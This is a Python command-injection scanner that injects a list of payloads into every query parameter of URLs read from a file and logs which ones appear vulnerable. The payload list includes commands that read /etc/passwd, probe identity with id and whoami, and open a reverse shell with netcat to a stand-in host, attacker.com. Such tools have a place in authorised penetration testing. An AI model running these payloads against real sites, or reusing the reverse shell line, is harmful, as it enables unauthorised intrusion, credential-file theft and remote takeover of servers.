import os
import requests

# List of common Command Injection payloads
CMD_PAYLOADS = [
    "1; uname -a",  # Retrieve system information
    "1 && cat /etc/passwd",
    "1 || ls -la",
    "1 | whoami",
    "$(whoami)",
    "`id`",
    "1 && sleep 10",  # Timing attack for detection
    "1; echo Vulnerable",
    "| nc -e /bin/sh attacker.com 4444",
]

def check_cmd_injection(url, param_name, payload, cookies, result_file):
    """
    Checks for command injection vulnerability by injecting a payload into a parameter and analyzing the response.
    """
    # Construct the URL with the payload
    vuln_url = f"{url}&{param_name}={payload}"
    try:
        response = requests.get(vuln_url, cookies=cookies, timeout=15)
        
        # Detect potential command injection
        if "root:" in response.text or "uid=" in response.text or "echo Vulnerable" in response.text:
            result_file.write(f"[+] Command Injection vulnerability found at {vuln_url}\n")
        elif response.elapsed.total_seconds() > 8:  # Timing-based detection
            result_file.write(f"[+] Possible Command Injection detected (timing attack) at {vuln_url}\n")
        else:
            result_file.write(f"[-] No Command Injection at {vuln_url}\n")
    except Exception as e:
        result_file.write(f"[!] Error checking {vuln_url}: {e}\n")


def cmd_injection_scan_from_file(filename, cookies):
    """
    Reads a file with URLs, extracts parameters, and checks each for command injection vulnerabilities.
    """
    try:
        # Create the output directory for CMD scan results
        output_dir = "./output/cmd_scans"
        os.makedirs(output_dir, exist_ok=True)

        # Generate the result file name
        base_filename = os.path.basename(filename)
        result_filename = f"{os.path.splitext(base_filename)[0]}_cmd.txt"
        result_filepath = os.path.join(output_dir, result_filename)

        # Open result file for writing
        with open(result_filepath, 'w') as result_file:
            with open(filename, 'r') as file:
                urls = file.readlines()

            # Normalize URLs
            urls = [url.strip() for url in urls]

            # Scan each URL for CMD injection vulnerabilities
            for url in urls:
                query_params = url.split('?')[1] if '?' in url else ''  # Extract parameters after '?'

                if query_params:
                    query_params = query_params.split('&')  # Split into individual parameters
                    for param in query_params:
                        param_name = param.split('=')[0]  # Extract the parameter name
                        for payload in CMD_PAYLOADS:
                            check_cmd_injection(url, param_name, payload, cookies, result_file)
                else:
                    result_file.write(f"[-] No parameters found in {url}\n")
    except Exception as e:
        print(f"[!] Error during CMD injection scan: {e}")
